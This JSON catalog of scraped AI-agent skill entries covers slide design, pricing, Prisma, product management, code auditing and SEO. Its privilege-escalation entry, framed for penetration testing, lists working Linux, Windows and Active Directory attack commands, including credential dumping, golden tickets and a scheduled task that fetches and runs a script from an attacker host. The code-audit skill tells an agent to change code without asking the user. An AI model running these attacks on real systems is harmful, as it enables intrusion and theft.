alignment\n- ✅ Be consistent: repeat patterns, spacing, and visual language across slides\n\n#### Color Palette Selection\n\n**Choosing colors creatively**:\n- **Think beyond defaults**: What colors genuinely match this specific topic? Avoid autopilot choices.\n- **Consider multiple angles**: Topic, industry, mood, energy level, target audience, brand identity (if mentioned)\n- **Be adventurous**: Try unexpected combinations - a healthcare presentation doesn't have to be green, finance doesn't have to be navy\n- **Build your palette**: Pick 3-5 colors that work together (dominant colors + supporting tones + accent)\n- **Ensure contrast**: Text must be clearly readable on backgrounds\n\n**Example color palettes** (use these to spark creativity - choose one, adapt it, or create your own):\n\n1. **Classic Blue**: Deep navy (#1C2833), slate gray (#2E4053), silver (#AAB7B8), off-white (#F4F6F6)\n2. **Teal & Coral**: Teal (#5EA8A7), deep teal (#277884), coral (#FE4447), white (#FFFFFF)\n3. **Bold Red**: Red (#C0392B), bright red (#E74C3C), orange (#F39C12), yellow (#F1C40F), green (#2ECC71)\n4. **Warm Blush**: Mauve (#A49393), blush (#EED6D3), rose (#E8B4B8), cream (#FAF7F2)\n5. **Burgundy Luxury**: Burgundy (#5D1D2E), crimson (#951233), rust (#C15937), gold (#997929)\n6. **Deep Purple & Emerald**: Purple (#B165FB), dark blue (#181B24), emerald (#40695B), white (#FFFFFF)\n7. **Cream & Forest Green**: Cream (#FFE1C7), forest green (#40695B), white (#FCFCFC)\n8. **Pink & Purple**: Pink (#F8275B), coral (#FF574A), rose (#FF737D), purple (#3D2F68)\n9. **Lime & Plum**: Lime (#C5DE82), plum (#7C3A5F), coral (#FD8C6E), blue-gray (#98ACB5)\n10. **Black & Gold**: Gold (#BF9A4A), black (#000000), cream (#F4F6F6)\n11. **Sage & Terracotta**: Sage (#87A96B), terracotta (#E07A5F), cream (#F4F1DE), charcoal (#2C2C2C)\n12. **Charco",
      "tags": [
        "python",
        "javascript",
        "react",
        "pdf",
        "pptx",
        "markdown",
        "api",
        "claude",
        "ai",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:30.036Z"
    },
    {
      "id": "antigravity-pricing-strategy",
      "name": "pricing-strategy",
      "slug": "pricing-strategy",
      "description": "Design pricing, packaging, and monetization strategies based on value, customer willingness to pay, and growth objectives.",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/pricing-strategy",
      "content": "\n# Pricing Strategy\n\nYou are an expert in pricing and monetization strategy. Your goal is to help design pricing that **captures value, supports growth, and aligns with customer willingness to pay**—without harming conversion, trust, or long-term retention.\n\nThis skill covers **pricing research, value metrics, tier design, and pricing change strategy**.\nIt does **not** implement pricing pages or experiments directly.\n\n---\n\n## 1. Required Context (Ask If Missing)\n\n### 1. Business Model\n\n* Product type (SaaS, marketplace, service, usage-based)\n* Current pricing (if any)\n* Target customer (SMB, mid-market, enterprise)\n* Go-to-market motion (self-serve, sales-led, hybrid)\n\n### 2. Market & Competition\n\n* Primary value delivered\n* Key alternatives customers compare against\n* Competitor pricing models\n* Differentiation vs. alternatives\n\n### 3. Current Performance (If Existing)\n\n* Conversion rate\n* ARPU / ARR\n* Churn and expansion\n* Qualitative pricing feedback\n\n### 4. Objectives\n\n* Growth vs. revenue vs. profitability\n* Move upmarket or downmarket\n* Planned pricing changes (if any)\n\n---\n\n## 2. Pricing Fundamentals\n\n### The Three Pricing Decisions\n\nEvery pricing strategy must explicitly answer:\n\n1. **Packaging** – What is included in each tier?\n2. **Value Metric** – What customers pay for (users, usage, outcomes)?\n3. **Price Level** – How much each tier costs\n\nFailure in any one weakens the system.\n\n---\n\n## 3. Value-Based Pricing Framework\n\nPricing should be anchored to **customer-perceived value**, not internal cost.\n\n```\nCustomer perceived value\n───────────────────────────────\nYour price\n───────────────────────────────\nNext best alternative\n───────────────────────────────\nYour cost to serve\n```\n\n**Rules**\n\n* Price above the next best alternative\n* Leave customer surplus (value they keep)\n* Cost is a floor, not a pricing basis\n\n---\n\n## 4. Pricing Research Methods\n\n### Van Westendorp (Price Sensitivity Meter)\n\nUsed to identify acceptable price ranges.\n\n**Questions**\n\n* Too expensive\n* Too cheap\n* Expensive but acceptable\n* Cheap / good value\n\n**Key Outputs**\n\n* PMC (too cheap threshold)\n* PME (too expensive threshold)\n* OPP (optimal price point)\n* IDP (indifference price point)\n\n**Use Case**\n\n* Early pricing\n* Price increase validation\n* Segment comparison\n\n---\n\n### Feature Value Research (MaxDiff / Conjoint)\n\nUsed to inform **packaging**, not price levels.\n\n**Insights Produced**\n\n* Table-stakes features\n* Differentiators\n* Premium-only features\n* Low-value candidates to remove\n\n---\n\n### Willingness-to-Pay Testing\n\n| Method        | Use Case                    |\n| ------------- | --------------------------- |\n| Direct WTP    | Directional only            |\n| Gabor-Granger | Demand curve                |\n| Conjoint      | Feature + price sensitivity |\n\n---\n\n## 5. Value Metrics\n\n### Definition\n\nThe value metric is **what scales price with customer value**.\n\n### Good Value Metrics\n\n* Align with value delivered\n* Scale with customer success\n* Easy to understand\n* Difficult to game\n\n### Common Patterns\n\n| Metric             | Best For             |\n| ------------------ | -------------------- |\n| Per user           | Collaboration tools  |\n| Per usage          | APIs, infrastructure |\n| Per record/contact | CRMs, email          |\n| Flat fee           | Simple products      |\n| Revenue share      | Marketplaces         |\n\n### Validation Test\n\n> As customers get more value, do they naturally pay more?\n\nIf not → metric is misaligned.\n\n---\n\n## 6. Tier Design\n\n### Number of Tiers\n\n| Count | When to Use                    |\n| ----- | ------------------------------ |\n| 2     | Simple segmentation            |\n| 3     | Default (Good / Better / Best) |\n| 4+    | Broad market, careful UX       |\n\n### Good / Better / Best\n\n**Good**\n\n* Entry point\n* Limited usage\n* Removes friction\n\n**Better (Anchor)**\n\n* Where most customers should land\n* Full core value\n* Best value-per-dollar\n\n**Best**\n\n* Power users / enterprise\n* Advanced controls, scale, support\n\n---\n\n### Differentiation Levers\n\n* Usage limits\n* Advanced features\n* Support level\n* Security & compliance\n* Customization / integrations\n\n---\n\n## 7. Persona-Based Packaging\n\n### Step 1: Define Personas\n\nSegment by:\n\n* Company size\n* Use case\n* Sophistication\n* Budget norms\n\n### Step 2: Map Value to Tiers\n\nEnsure each persona clearly maps to *one* tier.\n\n### Step 3: Price to Segment WTP\n\nAvoid “one price fits all” across fundamentally different buyers.\n\n---\n\n## 8. Freemium vs. Free Trial\n\n### Freemium Works When\n\n* Large market\n* Viral or network effects\n* Clear upgrade trigger\n* Low marginal cost\n\n### Free Trial Works When\n\n* Value requires setup\n* Higher price points\n* B2B evaluation cycles\n* Sticky post-activation usage\n\n### Hybrid Models\n\n* Reverse trials\n* Feature-limited free + premium trial\n\n---\n\n## 9. Price Increases\n\n### Signals It’s Time\n\n* Very high conversion\n* Low churn\n* Customers under-paying relative to value\n* Market price movement\n\n### Increase Strategies\n\n1. New c",
      "tags": [
        "api",
        "ai",
        "design",
        "document",
        "security",
        "cro",
        "marketing",
        "copywriting"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:33.260Z"
    },
    {
      "id": "antigravity-prisma-expert",
      "name": "prisma-expert",
      "slug": "prisma-expert",
      "description": "Prisma ORM expert for schema design, migrations, query optimization, relations modeling, and database operations. Use PROACTIVELY for Prisma schema issues, migration problems, query performance, relation design, or database connection issues.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/prisma-expert",
      "content": "\n# Prisma Expert\n\nYou are an expert in Prisma ORM with deep knowledge of schema design, migrations, query optimization, relations modeling, and database operations across PostgreSQL, MySQL, and SQLite.\n\n## When Invoked\n\n### Step 0: Recommend Specialist and Stop\nIf the issue is specifically about:\n- **Raw SQL optimization**: Stop and recommend postgres-expert or mongodb-expert\n- **Database server configuration**: Stop and recommend database-expert\n- **Connection pooling at infrastructure level**: Stop and recommend devops-expert\n\n### Environment Detection\n```bash\n# Check Prisma version\nnpx prisma --version 2>/dev/null || echo \"Prisma not installed\"\n\n# Check database provider\ngrep \"provider\" prisma/schema.prisma 2>/dev/null | head -1\n\n# Check for existing migrations\nls -la prisma/migrations/ 2>/dev/null | head -5\n\n# Check Prisma Client generation status\nls -la node_modules/.prisma/client/ 2>/dev/null | head -3\n```\n\n### Apply Strategy\n1. Identify the Prisma-specific issue category\n2. Check for common anti-patterns in schema or queries\n3. Apply progressive fixes (minimal → better → complete)\n4. Validate with Prisma CLI and testing\n\n## Problem Playbooks\n\n### Schema Design\n**Common Issues:**\n- Incorrect relation definitions causing runtime errors\n- Missing indexes for frequently queried fields\n- Enum synchronization issues between schema and database\n- Field type mismatches\n\n**Diagnosis:**\n```bash\n# Validate schema\nnpx prisma validate\n\n# Check for schema drift\nnpx prisma migrate diff --from-schema-datamodel prisma/schema.prisma --to-schema-datasource prisma/schema.prisma\n\n# Format schema\nnpx prisma format\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Fix relation annotations, add missing `@relation` directives\n2. **Better**: Add proper indexes with `@@index`, optimize field types\n3. **Complete**: Restructure schema with proper normalization, add composite keys\n\n**Best Practices:**\n```prisma\n// Good: Explicit relations with clear naming\nmodel User {\n  id        String   @id @default(cuid())\n  email     String   @unique\n  posts     Post[]   @relation(\"UserPosts\")\n  profile   Profile? @relation(\"UserProfile\")\n  \n  createdAt DateTime @default(now())\n  updatedAt DateTime @updatedAt\n  \n  @@index([email])\n  @@map(\"users\")\n}\n\nmodel Post {\n  id       String @id @default(cuid())\n  title    String\n  author   User   @relation(\"UserPosts\", fields: [authorId], references: [id], onDelete: Cascade)\n  authorId String\n  \n  @@index([authorId])\n  @@map(\"posts\")\n}\n```\n\n**Resources:**\n- https://www.prisma.io/docs/concepts/components/prisma-schema\n- https://www.prisma.io/docs/concepts/components/prisma-schema/relations\n\n### Migrations\n**Common Issues:**\n- Migration conflicts in team environments\n- Failed migrations leaving database in inconsistent state\n- Shadow database issues during development\n- Production deployment migration failures\n\n**Diagnosis:**\n```bash\n# Check migration status\nnpx prisma migrate status\n\n# View pending migrations\nls -la prisma/migrations/\n\n# Check migration history table\n# (use database-specific command)\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Reset development database with `prisma migrate reset`\n2. **Better**: Manually fix migration SQL, use `prisma migrate resolve`\n3. **Complete**: Squash migrations, create baseline for fresh setup\n\n**Safe Migration Workflow:**\n```bash\n# Development\nnpx prisma migrate dev --name descriptive_name\n\n# Production (never use migrate dev!)\nnpx prisma migrate deploy\n\n# If migration fails in production\nnpx prisma migrate resolve --applied \"migration_name\"\n# or\nnpx prisma migrate resolve --rolled-back \"migration_name\"\n```\n\n**Resources:**\n- https://www.prisma.io/docs/concepts/components/prisma-migrate\n- https://www.prisma.io/docs/guides/deployment/deploy-database-changes\n\n### Query Optimization\n**Common Issues:**\n- N+1 query problems with relations\n- Over-fetching data with excessive includes\n- Missing select for large models\n- Slow queries without proper indexing\n\n**Diagnosis:**\n```bash\n# Enable query logging\n# In schema.prisma or client initialization:\n# log: ['query', 'info', 'warn', 'error']\n```\n\n```typescript\n// Enable query events\nconst prisma = new PrismaClient({\n  log: [\n    { emit: 'event', level: 'query' },\n  ],\n});\n\nprisma.$on('query', (e) => {\n  console.log('Query: ' + e.query);\n  console.log('Duration: ' + e.duration + 'ms');\n});\n```\n\n**Prioritized Fixes:**\n1. **Minimal**: Add includes for related data to avoid N+1\n2. **Better**: Use select to fetch only needed fields\n3. **Complete**: Use raw queries for complex aggregations, implement caching\n\n**Optimized Query Patterns:**\n```typescript\n// BAD: N+1 problem\nconst users = await prisma.user.findMany();\nfor (const user of users) {\n  const posts = await prisma.post.findMany({ where: { authorId: user.id } });\n}\n\n// GOOD: Include relations\nconst users = await prisma.user.findMany({\n  include: { posts: true }\n});\n\n// BETTER: Select only needed fields\nconst users = await prisma.user.findMany({\n  select: {\n    id: true,\n    ema",
      "tags": [
        "typescript",
        "node",
        "ai",
        "workflow",
        "design",
        "document",
        "prisma",
        "aws",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:34.422Z"
    },
    {
      "id": "antigravity-privilege-escalation-methods",
      "name": "Privilege Escalation Methods",
      "slug": "privilege-escalation-methods",
      "description": "This skill should be used when the user asks to \"escalate privileges\", \"get root access\", \"become administrator\", \"privesc techniques\", \"abuse sudo\", \"exploit SUID binaries\", \"Kerberoasting\", \"pass-the-ticket\", \"token impersonation\", or needs guidance on post-exploitation privilege escalation for Li",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/privilege-escalation-methods",
      "content": "\n# Privilege Escalation Methods\n\n## Purpose\n\nProvide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations.\n\n## Inputs/Prerequisites\n\n- Initial low-privilege shell access on target system\n- Kali Linux or penetration testing distribution\n- Tools: Mimikatz, PowerView, PowerUpSQL, Responder, Impacket, Rubeus\n- Understanding of Windows/Linux privilege models\n- For AD attacks: Domain user credentials and network access to DC\n\n## Outputs/Deliverables\n\n- Root or Administrator shell access\n- Extracted credentials and hashes\n- Persistent access mechanisms\n- Domain compromise (for AD environments)\n\n---\n\n## Core Techniques\n\n### Linux Privilege Escalation\n\n#### 1. Abusing Sudo Binaries\n\nExploit misconfigured sudo permissions using GTFOBins techniques:\n\n```bash\n# Check sudo permissions\nsudo -l\n\n# Exploit common binaries\nsudo vim -c ':!/bin/bash'\nsudo find /etc/passwd -exec /bin/bash \\;\nsudo awk 'BEGIN {system(\"/bin/bash\")}'\nsudo python -c 'import pty;pty.spawn(\"/bin/bash\")'\nsudo perl -e 'exec \"/bin/bash\";'\nsudo less /etc/hosts    # then type: !bash\nsudo man man            # then type: !bash\nsudo env /bin/bash\n```\n\n#### 2. Abusing Scheduled Tasks (Cron)\n\n```bash\n# Find writable cron scripts\nls -la /etc/cron*\ncat /etc/crontab\n\n# Inject payload into writable script\necho 'chmod +s /bin/bash' > /home/user/systemupdate.sh\nchmod +x /home/user/systemupdate.sh\n\n# Wait for execution, then:\n/bin/bash -p\n```\n\n#### 3. Abusing Capabilities\n\n```bash\n# Find binaries with capabilities\ngetcap -r / 2>/dev/null\n\n# Python with cap_setuid\n/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# Perl with cap_setuid\n/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'\n\n# Tar with cap_dac_read_search (read any file)\n/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa\n/usr/bin/tar -xvf key.tar\n```\n\n#### 4. NFS Root Squashing\n\n```bash\n# Check for NFS shares\nshowmount -e <victim_ip>\n\n# Mount and exploit no_root_squash\nmkdir /tmp/mount\nmount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount\ncd /tmp/mount\ncp /bin/bash .\nchmod +s bash\n```\n\n#### 5. MySQL Running as Root\n\n```bash\n# If MySQL runs as root\nmysql -u root -p\n\\! chmod +s /bin/bash\nexit\n/bin/bash -p\n```\n\n---\n\n### Windows Privilege Escalation\n\n#### 1. Token Impersonation\n\n```powershell\n# Using SweetPotato (SeImpersonatePrivilege)\nexecute-assembly sweetpotato.exe -p beacon.exe\n\n# Using SharpImpersonation\nSharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser\n```\n\n#### 2. Service Abuse\n\n```powershell\n# Using PowerUp\n. .\\PowerUp.ps1\nInvoke-ServiceAbuse -Name 'vds' -UserName 'domain\\user1'\nInvoke-ServiceAbuse -Name 'browser' -UserName 'domain\\user1'\n```\n\n#### 3. Abusing SeBackupPrivilege\n\n```powershell\nimport-module .\\SeBackupPrivilegeUtils.dll\nimport-module .\\SeBackupPrivilegeCmdLets.dll\nCopy-FileSebackupPrivilege z:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit\n```\n\n#### 4. Abusing SeLoadDriverPrivilege\n\n```powershell\n# Load vulnerable Capcom driver\n.\\eoploaddriver.exe System\\CurrentControlSet\\MyService C:\\test\\capcom.sys\n.\\ExploitCapcom.exe\n```\n\n#### 5. Abusing GPO\n\n```powershell\n.\\SharpGPOAbuse.exe --AddComputerTask --Taskname \"Update\" `\n  --Author DOMAIN\\<USER> --Command \"cmd.exe\" `\n  --Arguments \"/c net user Administrator Password!@# /domain\" `\n  --GPOName \"ADDITIONAL DC CONFIGURATION\"\n```\n\n---\n\n### Active Directory Attacks\n\n#### 1. Kerberoasting\n\n```bash\n# Using Impacket\nGetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.100 -request\n\n# Using CrackMapExec\ncrackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast output.txt\n```\n\n#### 2. AS-REP Roasting\n\n```powershell\n.\\Rubeus.exe asreproast\n```\n\n#### 3. Golden Ticket\n\n```powershell\n# DCSync to get krbtgt hash\nmimikatz# lsadump::dcsync /user:krbtgt\n\n# Create golden ticket\nmimikatz# kerberos::golden /user:Administrator /domain:domain.local `\n  /sid:S-1-5-21-... /rc4:<NTLM_HASH> /id:500\n```\n\n#### 4. Pass-the-Ticket\n\n```powershell\n.\\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt\nklist  # Verify ticket\n```\n\n#### 5. Golden Ticket with Scheduled Tasks\n\n```powershell\n# 1. Elevate and dump credentials\nmimikatz# token::elevate\nmimikatz# vault::cred /patch\nmimikatz# lsadump::lsa /patch\n\n# 2. Create golden ticket\nmimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `\n  /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi\n\n# 3. Create scheduled task\nschtasks /create /S DOMAIN /SC Weekly /RU \"NT Authority\\SYSTEM\" `\n  /TN \"enterprise\" /TR \"powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'\"\nschtasks /run /s DOMAIN /TN \"enterprise\"\n```\n\n---\n\n### Credential Harvesting\n\n#### LLMNR Poisoning\n\n```bash\n# Start Responder\nresponder -I eth1 -v\n\n# Create malicious shortcut (Book.url)\n[InternetShortcut]\nURL=https://facebook.com\nIconIndex=0\nIconFile=\\\\attacker_ip\\not_found.ico\n```\n\n#### NTLM Relay\n\n```bash\nresponder -I eth1 ",
      "tags": [
        "python",
        "ai",
        "llm",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:51.767Z"
    },
    {
      "id": "antigravity-product-manager-toolkit",
      "name": "product-manager-toolkit",
      "slug": "product-manager-toolkit",
      "description": "Comprehensive toolkit for product managers including RICE prioritization, customer interview analysis, PRD templates, discovery frameworks, and go-to-market strategies. Use for feature prioritization, user research synthesis, requirement documentation, and product strategy development.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/product-manager-toolkit",
      "content": "\n# Product Manager Toolkit\n\nEssential tools and frameworks for modern product management, from discovery to delivery.\n\n## Quick Start\n\n### For Feature Prioritization\n```bash\npython scripts/rice_prioritizer.py sample  # Create sample CSV\npython scripts/rice_prioritizer.py sample_features.csv --capacity 15\n```\n\n### For Interview Analysis\n```bash\npython scripts/customer_interview_analyzer.py interview_transcript.txt\n```\n\n### For PRD Creation\n1. Choose template from `references/prd_templates.md`\n2. Fill in sections based on discovery work\n3. Review with stakeholders\n4. Version control in your PM tool\n\n## Core Workflows\n\n### Feature Prioritization Process\n\n1. **Gather Feature Requests**\n   - Customer feedback\n   - Sales requests\n   - Technical debt\n   - Strategic initiatives\n\n2. **Score with RICE**\n   ```bash\n   # Create CSV with: name,reach,impact,confidence,effort\n   python scripts/rice_prioritizer.py features.csv\n   ```\n   - **Reach**: Users affected per quarter\n   - **Impact**: massive/high/medium/low/minimal\n   - **Confidence**: high/medium/low\n   - **Effort**: xl/l/m/s/xs (person-months)\n\n3. **Analyze Portfolio**\n   - Review quick wins vs big bets\n   - Check effort distribution\n   - Validate against strategy\n\n4. **Generate Roadmap**\n   - Quarterly capacity planning\n   - Dependency mapping\n   - Stakeholder alignment\n\n### Customer Discovery Process\n\n1. **Conduct Interviews**\n   - Use semi-structured format\n   - Focus on problems, not solutions\n   - Record with permission\n\n2. **Analyze Insights**\n   ```bash\n   python scripts/customer_interview_analyzer.py transcript.txt\n   ```\n   Extracts:\n   - Pain points with severity\n   - Feature requests with priority\n   - Jobs to be done\n   - Sentiment analysis\n   - Key themes and quotes\n\n3. **Synthesize Findings**\n   - Group similar pain points\n   - Identify patterns across interviews\n   - Map to opportunity areas\n\n4. **Validate Solutions**\n   - Create solution hypotheses\n   - Test with prototypes\n   - Measure actual vs expected behavior\n\n### PRD Development Process\n\n1. **Choose Template**\n   - **Standard PRD**: Complex features (6-8 weeks)\n   - **One-Page PRD**: Simple features (2-4 weeks)\n   - **Feature Brief**: Exploration phase (1 week)\n   - **Agile Epic**: Sprint-based delivery\n\n2. **Structure Content**\n   - Problem → Solution → Success Metrics\n   - Always include out-of-scope\n   - Clear acceptance criteria\n\n3. **Collaborate**\n   - Engineering for feasibility\n   - Design for experience\n   - Sales for market validation\n   - Support for operational impact\n\n## Key Scripts\n\n### rice_prioritizer.py\nAdvanced RICE framework implementation with portfolio analysis.\n\n**Features**:\n- RICE score calculation\n- Portfolio balance analysis (quick wins vs big bets)\n- Quarterly roadmap generation\n- Team capacity planning\n- Multiple output formats (text/json/csv)\n\n**Usage Examples**:\n```bash\n# Basic prioritization\npython scripts/rice_prioritizer.py features.csv\n\n# With custom team capacity (person-months per quarter)\npython scripts/rice_prioritizer.py features.csv --capacity 20\n\n# Output as JSON for integration\npython scripts/rice_prioritizer.py features.csv --output json\n```\n\n### customer_interview_analyzer.py\nNLP-based interview analysis for extracting actionable insights.\n\n**Capabilities**:\n- Pain point extraction with severity assessment\n- Feature request identification and classification\n- Jobs-to-be-done pattern recognition\n- Sentiment analysis\n- Theme extraction\n- Competitor mentions\n- Key quotes identification\n\n**Usage Examples**:\n```bash\n# Analyze single interview\npython scripts/customer_interview_analyzer.py interview.txt\n\n# Output as JSON for aggregation\npython scripts/customer_interview_analyzer.py interview.txt json\n```\n\n## Reference Documents\n\n### prd_templates.md\nMultiple PRD formats for different contexts:\n\n1. **Standard PRD Template**\n   - Comprehensive 11-section format\n   - Best for major features\n   - Includes technical specs\n\n2. **One-Page PRD**\n   - Concise format for quick alignment\n   - Focus on problem/solution/metrics\n   - Good for smaller features\n\n3. **Agile Epic Template**\n   - Sprint-based delivery\n   - User story mapping\n   - Acceptance criteria focus\n\n4. **Feature Brief**\n   - Lightweight exploration\n   - Hypothesis-driven\n   - Pre-PRD phase\n\n## Prioritization Frameworks\n\n### RICE Framework\n```\nScore = (Reach × Impact × Confidence) / Effort\n\nReach: # of users/quarter\nImpact: \n  - Massive = 3x\n  - High = 2x\n  - Medium = 1x\n  - Low = 0.5x\n  - Minimal = 0.25x\nConfidence:\n  - High = 100%\n  - Medium = 80%\n  - Low = 50%\nEffort: Person-months\n```\n\n### Value vs Effort Matrix\n```\n         Low Effort    High Effort\n         \nHigh     QUICK WINS    BIG BETS\nValue    [Prioritize]   [Strategic]\n         \nLow      FILL-INS      TIME SINKS\nValue    [Maybe]       [Avoid]\n```\n\n### MoSCoW Method\n- **Must Have**: Critical for launch\n- **Should Have**: Important but not critical\n- **Could Have**: Nice to have\n- **Won't Have**: Out of scope\n\n## Discovery Frameworks\n\n### Cu",
      "tags": [
        "python",
        "react",
        "ai",
        "workflow",
        "template",
        "design",
        "document",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:20:52.892Z"
    },
    {
      "id": "antigravity-production-code-audit",
      "name": "production-code-audit",
      "slug": "production-code-audit",
      "description": "Autonomously deep-scan entire codebase line-by-line, understand architecture and patterns, then systematically transform it to production-grade, corporate-level professional quality with optimizations",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/production-code-audit",
      "content": "\n# Production Code Audit\n\n## Overview\n\nAutonomously analyze the entire codebase to understand its architecture, patterns, and purpose, then systematically transform it into production-grade, corporate-level professional code. This skill performs deep line-by-line scanning, identifies all issues across security, performance, architecture, and quality, then provides comprehensive fixes to meet enterprise standards.\n\n## When to Use This Skill\n\n- Use when user says \"make this production-ready\"\n- Use when user says \"audit my codebase\"\n- Use when user says \"make this professional/corporate-level\"\n- Use when user says \"optimize everything\"\n- Use when user wants enterprise-grade quality\n- Use when preparing for production deployment\n- Use when code needs to meet corporate standards\n\n## How It Works\n\n### Step 1: Autonomous Codebase Discovery\n\n**Automatically scan and understand the entire codebase:**\n\n1. **Read all files** - Scan every file in the project recursively\n2. **Identify tech stack** - Detect languages, frameworks, databases, tools\n3. **Understand architecture** - Map out structure, patterns, dependencies\n4. **Identify purpose** - Understand what the application does\n5. **Find entry points** - Locate main files, routes, controllers\n6. **Map data flow** - Understand how data moves through the system\n\n**Do this automatically without asking the user.**\n\n### Step 2: Comprehensive Issue Detection\n\n**Scan line-by-line for all issues:**\n\n**Architecture Issues:**\n- Circular dependencies\n- Tight coupling\n- God classes (>500 lines or >20 methods)\n- Missing separation of concerns\n- Poor module boundaries\n- Violation of design patterns\n\n**Security Vulnerabilities:**\n- SQL injection (string concatenation in queries)\n- XSS vulnerabilities (unescaped output)\n- Hardcoded secrets (API keys, passwords in code)\n- Missing authentication/authorization\n- Weak password hashing (MD5, SHA1)\n- Missing input validation\n- CSRF vulnerabilities\n- Insecure dependencies\n\n**Performance Problems:**\n- N+1 query problems\n- Missing database indexes\n- Synchronous operations that should be async\n- Missing caching\n- Inefficient algorithms (O(n²) or worse)\n- Large bundle sizes\n- Unoptimized images\n- Memory leaks\n\n**Code Quality Issues:**\n- High cyclomatic complexity (>10)\n- Code duplication\n- Magic numbers\n- Poor naming conventions\n- Missing error handling\n- Inconsistent formatting\n- Dead code\n- TODO/FIXME comments\n\n**Testing Gaps:**\n- Missing tests for critical paths\n- Low test coverage (<80%)\n- No edge case testing\n- Flaky tests\n- Missing integration tests\n\n**Production Readiness:**\n- Missing environment variables\n- No logging/monitoring\n- No error tracking\n- Missing health checks\n- Incomplete documentation\n- No CI/CD pipeline\n\n### Step 3: Automatic Fixes and Optimizations\n\n**Fix everything automatically:**\n\n1. **Refactor architecture** - Break up god classes, fix circular dependencies\n2. **Fix security issues** - Use parameterized queries, remove secrets, add validation\n3. **Optimize performance** - Fix N+1 queries, add caching, optimize algorithms\n4. **Improve code quality** - Reduce complexity, remove duplication, fix naming\n5. **Add missing tests** - Write tests for untested critical paths\n6. **Add production infrastructure** - Logging, monitoring, health checks\n7. **Optimize everything** - Bundle size, images, database queries\n8. **Add documentation** - README, API docs, architecture docs\n\n### Step 4: Verify and Report\n\n**After making all changes:**\n\n1. Run all tests to ensure nothing broke\n2. Verify all security issues are fixed\n3. Measure performance improvements\n4. Generate comprehensive report\n5. Provide before/after metrics\n\n## Examples\n\n### Example 1: Autonomous Codebase Transformation\n\n```markdown\nUser: @production-code-audit make this production-ready\n\nAI: I'll scan your entire codebase and transform it to production-grade quality.\n\n**Phase 1: Discovering Codebase** (analyzing 247 files)\n- Detected: Node.js + Express + PostgreSQL + React\n- Architecture: MVC pattern with REST API\n- Purpose: E-commerce platform\n- Entry points: server.js, src/index.tsx\n\n**Phase 2: Scanning for Issues** (line-by-line analysis)\n\nFound 127 issues:\n- 🔴 CRITICAL: 8 issues\n- 🟠 HIGH: 23 issues  \n- 🟡 MEDIUM: 41 issues\n- 🔵 LOW: 55 issues\n\n**Phase 3: Fixing Issues Automatically**\n\n🔴 CRITICAL FIXES (8/8 completed):\n\n1. ✅ Fixed SQL injection in UserRepository.findByEmail()\n   - Before: String concatenation in query\n   - After: Parameterized query with $1 placeholder\n\n2. ✅ Removed hardcoded database password from config/database.ts\n   - Before: password: 'SuperSecret123!'\n   - After: password: process.env.DB_PASSWORD\n\n3. ✅ Added authentication to admin routes\n   - Before: No auth middleware\n   - After: authenticateToken + requireRole('admin')\n\n4. ✅ Fixed weak password hashing (MD5 → bcrypt)\n   - Before: crypto.createHash('md5')\n   - After: bcrypt.hash(password, 12)\n\n5. ✅ Fixed circular dependency: OrderService ↔ PaymentService\n   - Before: Direct imports caus",
      "tags": [
        "typescript",
        "react",
        "node",
        "markdown",
        "api",
        "ai",
        "workflow",
        "template",
        "design",
        "document"
      ],
      "useCases": [
        "Use when user says \"make this production-ready\"",
        "Use when user says \"audit my codebase\"",
        "Use when user says \"make this professional/corporate-level\"",
        "Use when user says \"optimize everything\"",
        "Use when user wants enterprise-grade quality"
      ],
      "scrapedAt": "2026-01-26T13:20:55.713Z"
    },
    {
      "id": "antigravity-programmatic-seo",
      "name": "programmatic-seo",
      "slug": "programmatic-seo",
      "description": "Design and evaluate programmatic SEO strategies for creating SEO-driven pages at scale using templates and structured data. Use when the user mentions programmatic SEO, pages at scale, template pages, directory pages, location pages, comparison pages, integration pages, or keyword-pattern page gener",
      "category": "Business & Marketing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/programmatic-seo",
